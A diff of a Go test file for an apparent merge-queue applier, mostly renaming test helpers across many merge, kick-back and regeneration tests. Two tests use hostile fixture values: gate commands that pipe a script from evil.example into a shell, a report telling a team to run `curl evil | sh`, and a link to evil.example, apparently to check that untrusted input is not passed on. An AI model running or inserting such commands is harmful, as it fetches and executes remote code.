@@ -24,18 +24,18 @@ import (
 // validated is the green verdict on c's candidate built onto onto, on top of after.
 func validated(c types.Change, onto, after string) types.Verdict {
 	return types.Verdict{BaseCommit: base, Change: c, Decision: types.DecisionMerge, After: after, Onto: onto,
-		CandidateCommit: candidateOf(onto, c.Head), Method: c.Method, Depth: 1}
+		CandidateCommit: candidateID(onto, c.Head), Method: c.Method, Depth: 1}
 }
 
-// applierFor wires an Applier to d for plan, whose verdicts arrive in one final poll.
+// newApplier wires an Applier to d for plan, whose verdicts arrive in one final poll.
 // Every mark succeeds unless the test set [doubles.marks] first.
-func applierFor(t *testing.T, d doubles, plan types.Plan, verdicts ...types.Verdict) *Applier {
+func newApplier(t *testing.T, d doubles, plan types.Plan, verdicts ...types.Verdict) *Applier {
 	t.Helper()
-	return applierForBatch(t, d, types.VerdictBatch{Verdicts: verdicts, Done: true})
+	return newBatchApplier(t, d, types.VerdictBatch{Verdicts: verdicts, Done: true})
 }
 
-// applierForBatch is applierFor with the one final poll answering batch.
-func applierForBatch(t *testing.T, d doubles, batch types.VerdictBatch) *Applier {
+// newBatchApplier is newApplier with the one final poll answering batch.
+func newBatchApplier(t *testing.T, d doubles, batch types.VerdictBatch) *Applier {
 	t.Helper()
 	d.noCheckouts()
 	d.noneGreen()
@@ -62,8 +62,8 @@ func (d doubles) lists(changes types.Changes) *mock.Call {
 	return d.provider.EXPECT().ListChanges(mock.Anything, types.ListQuery{Base: "main"}).Return(changes, nil).Once()
 }
 
-// squashOf is the squash message applying writes for c, whose one commit is "change <id>".
-func squashOf(c types.Change) string { return "* change " + c.ID }
+// expectedSquash is the squash message applying writes for c, whose one commit is "change <id>".
+func expectedSquash(c types.Change) string { return "* change " + c.ID }
 
 // squashes answers the read of c's own commits applying writes its squash message from.
 func (d doubles) squashes(c types.Change) {
@@ -150,7 +150,7 @@ func (d doubles) cleanMerge(v types.Verdict, res types.MergeResult) (success, me
 	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil).Once()
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
 	success = d.green(c, c.Head)
-	merge = d.mergedAt(c, c.Head, squashOf(v.Change), after, "validated", res, base)
+	merge = d.mergedAt(c, c.Head, expectedSquash(v.Change), after, "validated", res, base)
 	return success, merge
 }
 
@@ -189,9 +189,9 @@ func TestAGreenChangeSucceedsRightBeforeItMergesAtItsHead(t *testing.T) {
 			success, merge := d.cleanMerge(v, res)
 			merge.NotBefore(success)
 			var out bytes.Buffer
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
 			a.Events = NewEvents(&out)
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 			assert.Contains(t, out.String(), `"kind":"merged","change":"1"`)
 			assert.Equal(t, res.ByProvider, strings.Contains(out.String(), `"by_provider":true`))
 		})
@@ -213,8 +213,8 @@ func TestABaseThatMovedRightBeforeTheSuccessLeavesTheChangeWaiting(t *testing.T)
 	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
 	d.waits(c, c.Head, "main moved to "+moved[:12]+" before its merge")
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // A run starts with nothing about to merge, so a success an earlier run left on an open
@@ -229,8 +229,8 @@ func TestARunSetsBackEverySuccessAnEarlierRunLeft(t *testing.T) {
 		types.CommitStatus{Context: DefaultStatusContext, State: types.StatePending, Description: "waiting: an earlier run stopped before merging it"}).
 		Return(nil).Once().NotBefore(list)
 	d.status(c, c.Head, types.StatePending, "waiting: not validated in this run").NotBefore(revoked)
-	a := applierFor(t, d, planOf([]types.Change{c}))
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // A success applying cannot follow through goes back to pending before applying returns:
@@ -243,7 +243,7 @@ func TestASuccessApplyingCannotFollowThroughGoesBackToPending(t *testing.T) {
 	for _, c := range []types.Change{s.one, s.two} {
 		d.status(c, c.Head, types.StatePending, "waiting: applying stopped before its merge: resolve main: network down").NotBefore(merge)
 	}
-	a := applierFor(t, d, s.plan, s.v1, s.v2)
+	a := newApplier(t, d, s.plan, s.v1, s.v2)
 	require.ErrorContains(t, a.Run(t.Context(), s.plan), "network down")
 }
 
@@ -262,9 +262,9 @@ func TestABaseThatDoesNotCarryThePredictedTreeStopsApplying(t *testing.T) {
 	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: one.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, one.Head).Return(approvedAs(one), nil).Once()
 	d.green(one, one.Head)
-	d.mergesAt(one, one.Head, squashOf(v.Change), after, "other", base)
-	a := applierFor(t, d, planOf([]types.Change{one}, []types.Change{two}), v, validated(two, base, ""))
-	err := a.Run(t.Context(), planOf([]types.Change{one}, []types.Change{two}))
+	d.mergesAt(one, one.Head, expectedSquash(v.Change), after, "other", base)
+	a := newApplier(t, d, newPlan([]types.Change{one}, []types.Change{two}), v, validated(two, base, ""))
+	err := a.Run(t.Context(), newPlan([]types.Change{one}, []types.Change{two}))
 	require.ErrorContains(t, err, "#1 merged, but main at "+after[:12]+" carries tree other, not the validated validated")
 }
 
@@ -291,7 +291,7 @@ func TestEveryMergeMethodMustMergeInItsOwnShape(t *testing.T) {
 			if tc.method == types.MethodRebase {
 				d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, tip, "after", []string(nil)).Return(tc.line, nil)
 			}
-			r := &applyRun{Applier: &Applier{vcs: d.vcs, clone: clone}, plan: planOf()}
+			r := &applyRun{Applier: &Applier{vcs: d.vcs, clone: clone}, plan: newPlan()}
 			err := r.mergedAs(t.Context(), change("1"), tip, "after", head, "tree", tc.method)
 			if tc.wantErr {
 				require.ErrorContains(t, err, "is not what a "+string(tc.method)+" merge onto")
@@ -329,13 +329,13 @@ func TestAnUpdateCommitIsTheValidatedTreeOnTheHeadAndTheTip(t *testing.T) {
 	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
 	success := d.green(c, update).NotBefore(push)
-	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base).NotBefore(success)
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
+	d.mergesAt(c, update, expectedSquash(v.Change), after, "validated", base).NotBefore(success)
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	a.Regenerate = func(context.Context, types.Regeneration) error {
 		t.Error("the update commit's outputs come from the validated tree the rebuild reproduced")
 		return nil
 	}
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // A change whose merge auto-resolution settles is merged through an update commit holding
@@ -381,11 +381,11 @@ func TestAnAutoResolvedChangeMergesThroughAnUpdateCommitApplySettledItself(t *te
 	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
 	success := d.green(c, update).NotBefore(push)
-	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base).NotBefore(success)
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
+	d.mergesAt(c, update, expectedSquash(v.Change), after, "validated", base).NotBefore(success)
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	var events bytes.Buffer
 	a.Events = NewEvents(&events)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Contains(t, events.String(), `"kind":"resolved","change":"1","reason":`+jsonString(t, chNote)+`,"commit":"`+v.CandidateCommit+`"`)
 }
 
@@ -486,10 +486,10 @@ func TestAnUpdateCommitIsCommittedByTheConfiguredCommitterElseTheProviders(t *te
 				d.vcs.EXPECT().Push(mock.Anything, clone.Root, mock.Anything).Return(fmt.Errorf("push: %w", magustypes.ErrStaleLease))
 				d.waits(c, c.Head, "its branch moved")
 			}
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
 			a.Committer = tc.configured
 			a.Regenerate = func(context.Context, types.Regeneration) error { return nil }
-			err := a.Run(t.Context(), planOf([]types.Change{c}))
+			err := a.Run(t.Context(), newPlan([]types.Change{c}))
 			if tc.want == (magustypes.Person{}) {
 				require.ErrorIs(t, err, types.ErrNoCommitter)
 				return
@@ -533,9 +533,9 @@ func TestAnUpdateCommitGoesOnlyWhereItBelongs(t *testing.T) {
 			} else {
 				d.waits(c, c.Head, tc.wait)
 			}
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
 			a.Regenerate = func(context.Context, types.Regeneration) error { return nil }
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 		})
 	}
 }
@@ -552,8 +552,8 @@ func TestACandidateTheRebuildDoesNotReproduceIsValidatedAgain(t *testing.T) {
 	d.rebuilds(c, base, head("rebuilt"), "a/x.go")
 	d.facts.EXPECT().Classify(mock.Anything, []string{"a/x.go"}).Return(map[string]types.Writes{}, nil)
 	d.waits(c, c.Head, "rebuilding its candidate gave "+head("rebuilt")[:12]+", not the validated "+v.CandidateCommit[:12])
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // The job holding the write credential never runs a change's code: a merge needing
@@ -578,12 +578,12 @@ func TestAMergeNeedingRegenerationOfCodeTheChangeTouchedIsKickedBack(t *testing.
 			strings.Contains(k.Report, "it changes code their regeneration runs (`gen/gen.go`), and validation left no regenerated candidate this queue can check, so only its author can regenerate them") &&
 			strings.Contains(k.Report, "Merge `main` in, regenerate, and push. Then queue it again")
 	})).Run(func(context.Context, types.Change, string, types.Kick) { marks.add("kicked") }).Return(nil).Once()
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	a.Regenerate = func(context.Context, types.Regeneration) error {
 		t.Error("regenerated from code the change touched")
 		return nil
 	}
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Equal(t, []string{"1 queued", "kicked", "1 needs_regeneration"}, marks.entries(),
 		"the kick-back leaves the change needing regeneration, not merely kicked back")
 }
@@ -624,12 +624,12 @@ func TestRegenerationOntoAChangeMergedThisRunProvesWhatLiesBeneath(t *testing.T)
 			} else {
 				d.waits(two, two.Head, tc.wait)
 			}
-			a := applierFor(t, d, planOf([]types.Change{one, two}), v1, v2)
+			a := newApplier(t, d, newPlan([]types.Change{one, two}), v1, v2)
 			a.Regenerate = func(context.Context, types.Regeneration) error {
 				t.Error("regenerated without a proof over what it builds on")
 				return nil
 			}
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one, two})))
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one, two})))
 		})
 	}
 }
@@ -674,15 +674,15 @@ func TestTheBasesOwnRegenerationRebuildsTheCandidate(t *testing.T) {
 				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 				d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
 				d.green(c, c.Head)
-				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
+				d.mergesAt(c, c.Head, expectedSquash(v.Change), after, "validated", base)
 			}
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
 			a.Regenerate = func(_ context.Context, r types.Regeneration) error {
 				units = r.Units
 				assert.Equal(t, []string{"gen/x.go"}, r.Paths)
 				return nil
 			}
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 			assert.Equal(t, []string{"gen"}, units)
 		})
 	}
@@ -794,10 +794,10 @@ func TestValidationsCheckedRegenerationLandsThroughAnUpdateCommit(t *testing.T) 
 	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
 	success := d.green(c, update).NotBefore(push)
-	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base).NotBefore(success).Run(func(mock.Arguments) { marks.add("merged") })
-	a := applierForBatch(t, d, types.VerdictBatch{Verdicts: []types.Verdict{v}, Bundles: map[string]string{"1": "/v/1/candidate.bundle"}, Done: true})
+	d.mergesAt(c, update, expectedSquash(v.Change), after, "validated", base).NotBefore(success).Run(func(mock.Arguments) { marks.add("merged") })
+	a := newBatchApplier(t, d, types.VerdictBatch{Verdicts: []types.Verdict{v}, Bundles: map[string]string{"1": "/v/1/candidate.bundle"}, Done: true})
 	a.Regenerate = noRegeneration(t)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Equal(t, []string{"1 queued", "merged", "1 none"}, marks.entries(), "a change the queue settled is never marked kicked back")
 }
 
@@ -867,9 +867,9 @@ func TestAValidationBundleApplyingCannotCheckIsRefused(t *testing.T) {
 				d.vcs.EXPECT().CreateCheckout(mock.Anything, clone.Root, mock.Anything, v.CandidateCommit).RunAndReturn(checkoutHolding(tc.cand)).Once()
 			}
 			d.kicks(c, types.CodeKickRefused, tc.kick)
-			a := applierForBatch(t, d, types.VerdictBatch{Verdicts: []types.Verdict{v}, Bundles: map[string]string{"1": "/v/1/candidate.bundle"}, Done: true})
+			a := newBatchApplier(t, d, types.VerdictBatch{Verdicts: []types.Verdict{v}, Bundles: map[string]string{"1": "/v/1/candidate.bundle"}, Done: true})
 			a.Regenerate = noRegeneration(t)
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 		})
 	}
 }
@@ -915,12 +915,12 @@ func TestAGatedMergeSettlingAGeneratedConflictMergesWithoutABundle(t *testing.T)
 	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
 	success := d.green(c, update).NotBefore(push)
-	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base).NotBefore(success).Run(func(mock.Arguments) { marks.add("merged") })
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
+	d.mergesAt(c, update, expectedSquash(v.Change), after, "validated", base).NotBefore(success).Run(func(mock.Arguments) { marks.add("merged") })
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	a.Regenerate = noRegeneration(t)
 	var events bytes.Buffer
 	a.Events = NewEvents(&events)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Equal(t, []string{"1 queued", "merged", "1 none"}, marks.entries())
 	assert.Contains(t, events.String(), "took its own merge, the commit validation gated, which settles `gen/x.go` as the change has them")
 }
@@ -963,8 +963,8 @@ func TestRequiredChecksHoldOrKickBeforeAnythingIsRebuilt(t *testing.T) {
 			} else {
 				d.waits(c, c.Head, tc.wait)
 			}
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 			if tc.kick != "" {
 				assert.Equal(t, []string{"1 queued", "1 kicked_back"}, marks.entries(), "no longer queued")
 			}
@@ -996,8 +996,8 @@ func TestStaleRedChecksGetOneUpdateCommitThatRunsThemAgain(t *testing.T) {
 		Tree:       "validated", Parents: []string{c.Head, base}}).Return(update, nil)
 	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
 	d.status(c, update, types.StatePending, "waiting: its required checks `ci gate` failed on an older main; pushed "+update[:12]+", which carries "+base[:12]).NotBefore(push)
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // Where the queue cannot push that update commit (a fork, a branch another change shares,
@@ -1029,8 +1029,8 @@ func TestStaleRedChecksTheQueueCannotRunAgainAreKickedBack(t *testing.T) {
 			d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 			d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "validated", "validated").Return(nil, nil).Twice()
 			d.kicks(c, types.CodeKickRefused, tc.kick)
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 		})
 	}
 }
@@ -1044,8 +1044,8 @@ func TestGreenRequiredChecksMerge(t *testing.T) {
 	d.provider.EXPECT().RequiredChecks(mock.Anything, mock.Anything, c.Head).Return(ciGate(types.StateSuccess), nil).Once()
 	success, merge := d.cleanMerge(v, types.MergeResult{})
 	merge.NotBefore(success)
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // Applying re-reads the change before it merges: a head pushed, an intent withdrawn, an
@@ -1072,8 +1072,8 @@ func TestAChangeThatMovedSinceValidationIsNotMerged(t *testing.T) {
 			d.bases(base)
 			d.rechecks(c, tc.a)
 			d.waits(c, tc.commit, tc.reason)
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 		})
 	}
 }
@@ -1093,8 +1093,8 @@ func TestAChangeWithdrawnRightBeforeItsMergeIsNotMerged(t *testing.T) {
 	withdrawn.Queued = false
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(withdrawn, nil).Once()
 	d.waits(c, c.Head, "its merge intent was withdrawn before its merge")
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 func TestAProviderRefusalWaitsAndHoldsWhatIsValidatedOnIt(t *testing.T) {
@@ -1111,13 +1111,13 @@ func TestAProviderRefusalWaitsAndHoldsWhatIsValidatedOnIt(t *testing.T) {
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, one.Head).Return(approvedAs(one), nil).Once()
 	success := d.green(one, one.Head)
 	d.squashes(one)
-	refused := d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: one.Head, Message: squashOf(v1.Change)}).
+	refused := d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: one.Head, Message: expectedSquash(v1.Change)}).
 		Return(types.MergeResult{}, errors.New("required status missing")).NotBefore(success)
 	// The success it posted goes back to pending.
 	d.status(one, one.Head, types.StatePending, "waiting: the provider refused the merge: required status missing").NotBefore(refused)
 	d.waits(two, two.Head, "validated on top of #1, which did not merge")
-	a := applierFor(t, d, planOf([]types.Change{one, two}), v1, v2)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one, two})))
+	a := newApplier(t, d, newPlan([]types.Change{one, two}), v1, v2)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one, two})))
 }
 
 // A verdict names its change, but only the plan says which head was admitted and what
@@ -1138,8 +1138,8 @@ func TestAVerdictThatDisagreesWithThePlanMergesNothing(t *testing.T) {
 			d := newDoubles(t)
 			d.caps()
 			d.waits(one, one.Head, tc.reason)
-			a := applierFor(t, d, planOf([]types.Change{one}), tc.v)
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
+			a := newApplier(t, d, newPlan([]types.Change{one}), tc.v)
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one})))
 		})
 	}
 	t.Run("without the change beneath", func(t *testing.T) {
@@ -1148,8 +1148,8 @@ func TestAVerdictThatDisagreesWithThePlanMergesNothing(t *testing.T) {
 		d.waits(one, one.Head, "conflicts")
 		d.waits(two, two.Head, "validated without #1, which it is stacked on")
 		held := types.Verdict{BaseCommit: base, Change: one, Decision: types.DecisionWait, Code: types.CodeWaitConflictAhead, Reason: "conflicts"}
-		a := applierFor(t, d, planOf([]types.Change{one, two}), held, validated(two, base, ""))
-		require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one, two})))
+		a := newApplier(t, d, newPlan([]types.Change{one, two}), held, validated(two, base, ""))
+		require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one, two})))
 	})
 }
 
@@ -1165,7 +1165,7 @@ func TestAnUnreadableVerdictHoldsItsChangeAlone(t *testing.T) {
 	a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
 	require.NoError(t, err)
 	a.Base = "main"
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one})))
 }
 
 // Planning's verdicts and validation's red ones reach the provider, each naming the run
@@ -1185,7 +1185,7 @@ func TestSettledVerdictsReachTheProvider(t *testing.T) {
 		Claim:  "the gate exited 1", Source: "acme/widgets/runs/7", Reproduce: &types.Reproduction{Gate: "make test", Regenerate: "make gen"}})
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, moved.Head).Return(types.Approval{Head: head("newer"), Base: "main", Method: types.MethodSquash}, nil)
 	d.waits(moved, head("newer"), "head moved to "+head("newer")[:12]+" since it was decided")
-	plan := planOf([]types.Change{red}, []types.Change{moved})
+	plan := newPlan([]types.Change{red}, []types.Change{moved})
 	plan.Verdicts = []types.Verdict{
 		{Change: kicked, Decision: types.DecisionKick, Code: types.CodeKickConflict, Report: "@team see [this](https://evil.example)", Paths: []string{"a.go"}},
 		{Change: held, Decision: types.DecisionWait, Code: types.CodeWaitNotApproved, Reason: "not approved"},
@@ -1194,7 +1194,7 @@ func TestSettledVerdictsReachTheProvider(t *testing.T) {
 	redV := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRed, Onto: base,
 		Reason: "the gate exited 1", Report: "@team run `curl evil | sh`", Gate: `bash -c "curl https://evil.example | sh"`}
 	movedV := types.Verdict{BaseCommit: base, Change: moved, Decision: types.DecisionKick, Code: types.CodeKickRed, Report: "the gate failed"}
-	a := applierFor(t, d, plan, redV, movedV)
+	a := newApplier(t, d, plan, redV, movedV)
 	a.Source = "acme/widgets/runs/7"
 	a.Reproduce = types.Reproduction{Gate: "make test", Regenerate: "make gen"}
 	require.NoError(t, a.Run(t.Context(), plan))
@@ -1210,8 +1210,8 @@ func TestAKickBackReproducesOnlyApplysOwnHookLines(t *testing.T) {
 		Claim: "building its candidate failed"})
 	v := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRefused,
 		Reason: "building its candidate failed", Gate: `sh -c "curl https://evil.example | sh"`}
-	a := applierFor(t, d, planOf([]types.Change{red}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{red})))
+	a := newApplier(t, d, newPlan([]types.Change{red}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{red})))
 }
 
 func TestWhatNoVerdictReachedWaitsForTheNextRun(t *testing.T) {
@@ -1219,8 +1219,8 @@ func TestWhatNoVerdictReachedWaitsForTheNextRun(t *testing.T) {
 	one := change("1", "a")
 	d.caps()
 	d.waits(one, one.Head, "not validated in this run")
-	a := applierFor(t, d, planOf([]types.Change{one}))
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
+	a := newApplier(t, d, newPlan([]types.Change{one}))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one})))
 }
 
 // A dry run reports and calls nothing on the provider: no expectation is set on it, and
@@ -1230,10 +1230,10 @@ func TestApplyDryRunCallsNothingOnTheProvider(t *testing.T) {
 	one := change("1", "a")
 	marks := d.marks(nil)
 	var out bytes.Buffer
-	a := applierFor(t, d, planOf([]types.Change{one}), validated(one, base, ""))
+	a := newApplier(t, d, newPlan([]types.Change{one}), validated(one, base, ""))
 	a.DryRun, a.Events = true, NewEvents(&out)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
-	assert.Contains(t, out.String(), "dry run: would merge candidate "+candidateOf(base, one.Head)[:12])
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{one})))
+	assert.Contains(t, out.String(), "dry run: would merge candidate "+candidateID(base, one.Head)[:12])
 	assert.Empty(t, marks.entries())
 }
 
@@ -1249,7 +1249,7 @@ func TestARunMarksWhatThePlanAdmittedAndClearsAQueuedMarkLeftBehind(t *testing.T
 	d.waits(held, held.Head, "r")
 	d.waits(one, one.Head, "not validated in this run")
 	d.waits(two, two.Head, "not validated in this run")
-	plan := planOf([]types.Change{one}, []types.Change{two})
+	plan := newPlan([]types.Change{one}, []types.Change{two})
 	plan.Verdicts = []types.Verdict{waiting("3"), {Change: gone, Decision: types.DecisionMerged, Reason: "its head is already on main"}}
 	plan.Unqueued = []types.UnqueuedChange{
 		{ID: "4", Repo: "acme/acme", Head: head("4"), Mark: types.MarkQueued},
@@ -1258,7 +1258,7 @@ func TestARunMarksWhatThePlanAdmittedAndClearsAQueuedMarkLeftBehind(t *testing.T
 		{ID: "7", Repo: "acme/acme", Head: head("7")},
 	}
 	plan.Closed = []types.ClosedChange{{ID: "9", Repo: "acme/acme"}}
-	a := applierFor(t, d, plan)
+	a := newApplier(t, d, plan)
 	require.NoError(t, a.Run(t.Context(), plan))
 	assert.Equal(t, []string{"1 queued", "2 queued", "3 queued", "4 none in acme/acme", "9 none in acme/acme", "5 none"}, marks.entries(),
 		"a closed change still showing a queue label is cleared, whoever merged or closed it")
@@ -1276,8 +1276,8 @@ func TestAKickBackMarksTheChangeKickedBack(t *testing.T) {
 		marks.add("kicked")
 	}).Return(nil).Once()
 	red := types.Verdict{BaseCommit: base, Change: c, Decision: types.DecisionKick, Code: types.CodeKickRed, Report: "the gate failed"}
-	a := applierFor(t, d, planOf([]types.Change{c}), red)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), red)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Equal(t, []string{"1 queued", "kicked", "1 kicked_back"}, marks.entries())
 }
 
@@ -1290,8 +1290,8 @@ func TestAMergeClearsTheMark(t *testing.T) {
 	marks := d.marks(nil)
 	_, merge := d.cleanMerge(v, types.MergeResult{ByProvider: true})
 	merge.Run(func(mock.Arguments) { marks.add("merged") })
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Equal(t, []string{"1 queued", "merged", "1 none"}, marks.entries())
 }
 
